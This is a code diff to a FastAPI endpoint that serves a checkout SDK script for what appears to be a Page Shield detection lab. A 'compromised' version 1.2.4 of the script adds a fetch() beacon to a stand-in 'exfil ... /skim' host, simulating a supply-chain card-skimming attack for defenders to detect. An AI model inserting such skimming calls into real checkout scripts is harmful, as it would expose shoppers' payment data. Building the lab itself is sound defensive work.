@@ -5,6 +5,7 @@ import json
 from fastapi import APIRouter, File, Query, Request, Response as FastAPIResponse, UploadFile
 from fastapi.responses import PlainTextResponse, Response
 
+from app.config import settings
 from app.db import get_conn
 from app.schemas.products import SearchResponse
 from app.services.complexity import COMPLEXITY_HEADER, score_search_query
@@ -221,6 +222,16 @@ async def prefs_js():
 
 @router.get("/js/checkout-sdk.js")
 async def checkout_sdk(v: str = "1.2.3"):
+    """Serve the safe (`v=1.2.3`) or compromised (`v=1.2.4`) checkout SDK.
+
+    Page Shield Task 9 simulates a supply-chain attack by flipping the
+    traffic-profile to request `v=1.2.4`, which includes an outbound fetch
+    to the exfil URL configured via the `CHECKOUT_SDK_EXFIL_URL` env var
+    (defaults to `https://exfil.{SLUG}.sxplab.com/skim` — the `{SLUG}`
+    placeholder stays literal in the served JS so lab deployments that
+    do not override the env var still produce an observably distinct
+    outbound connection).
+    """
     data = {"version": v, "status": "ready"}
     body = [
         "window.CheckoutSDK = {",
@@ -229,7 +240,10 @@ async def checkout_sdk(v: str = "1.2.3"):
         "    fetch('https://payments.singleorigin.example/init', {mode: 'no-cors'}).catch(() => {});",
     ]
     if v == "1.2.4":
-        body.append("    fetch('https://exfil.singleorigin.example/skim', {mode: 'no-cors'}).catch(() => {});")
+        exfil_url = settings.checkout_sdk_exfil_url
+        body.append(
+            f"    fetch({json.dumps(exfil_url)}, {{mode: 'no-cors'}}).catch(() => {{}});"
+        )
     body.extend(["  }", "};", "CheckoutSDK.init();"])
     return Response(content="\n".join(body), media_type="application/javascript")
 
